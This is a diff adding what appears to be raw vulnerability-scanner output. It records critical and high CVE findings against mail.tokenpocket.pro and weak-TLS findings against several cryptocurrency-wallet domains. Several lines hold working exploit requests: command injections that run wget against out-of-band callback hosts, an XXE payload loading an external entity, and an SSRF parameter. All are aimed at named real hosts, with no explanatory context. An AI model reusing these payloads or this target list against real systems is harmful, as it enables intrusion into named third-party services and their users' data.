@@ -1,0 +1,21 @@
+[CVE-2014-3206] [http] [critical] https://mail.tokenpocket.pro/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://dbkjmmd46120e4sdc5v0xgo5paau9soqp.oast.online;
+[CVE-2014-3206] [http] [critical] https://mail.tokenpocket.pro/backupmgt/localJob.php?session=fail;wget+http://dbkjmmd46120e4sdc5v0tbihq3i4zfwka.oast.online;
+[CVE-2016-1555] [http] [critical] https://mail.tokenpocket.pro/boardDataWW.php
+[CVE-2019-10758] [http] [critical] https://mail.tokenpocket.pro/checkValid
+[CVE-2019-2767] [http] [high] https://mail.tokenpocket.pro/xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//dbkjmmd46120e4sdc5v09bpessfaskrym.oast.online/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123
+[CVE-2020-7796] [http] [critical] https://mail.tokenpocket.pro/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://dbkjmmd46120e4sdc5v0bifohrmotcxs4.oast.online%23
+[CVE-2021-31755] [http] [critical] https://mail.tokenpocket.pro/goform/setmac
+[CVE-2021-33544] [http] [high] https://mail.tokenpocket.pro//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://dbkjmmd46120e4sdc5v01cq65xwnti6sn.oast.online)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[hashicorp-consul-rce] [http] [critical] https://mail.tokenpocket.pro/v1/agent/service/register
+[weak-cipher-suites:tls-1.0] [ssl] [low] magal.com.dowww.bitcoin.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] magal.com.dowww.bitcoin.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] magic.solflare.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] magic.solflare.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mail.guarda.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mail.guarda.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mail.pay2.bitcoin.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mail.pay2.bitcoin.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mail.zengo.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mail.zengo.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] mail2.bitcoin.com:443 ["[tls10 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] mail2.bitcoin.com:443 ["[tls11 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA]"]
